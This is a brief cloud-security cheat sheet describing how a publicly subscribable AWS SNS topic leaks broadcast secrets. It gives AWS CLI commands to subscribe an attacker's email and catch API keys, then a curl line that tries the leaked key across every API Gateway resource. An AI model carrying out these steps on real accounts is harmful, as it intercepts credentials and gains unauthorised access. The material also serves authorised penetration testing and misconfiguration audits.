# Public SNS Topic Secret Leak

If an SNS topic's policy has `Principal: "*"` on subscribe, anyone can subscribe their own email/endpoint to it — if the application later broadcasts a secret (API key, rotation notice) to that topic, it lands in your inbox:

```bash
aws sns list-topics --profile <profile>
aws sns get-topic-attributes --topic-arn <ARN> --profile <profile>     # check the Policy for Principal "*"
aws sns subscribe --topic-arn <ARN> --protocol email --notification-endpoint <your-email> --profile <profile>
# confirm via the link in the subscription email, then wait for/trigger a broadcast
```
A leaked key found this way is often scoped more broadly than intended — try it against every API Gateway stage/resource you can enumerate, not just the one it was issued for:
```bash
aws apigateway get-rest-apis --profile <profile>
aws apigateway get-resources --rest-api-id <id> --profile <profile>
curl "https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<resource>" -H "x-api-key: <leaked-key>"
```
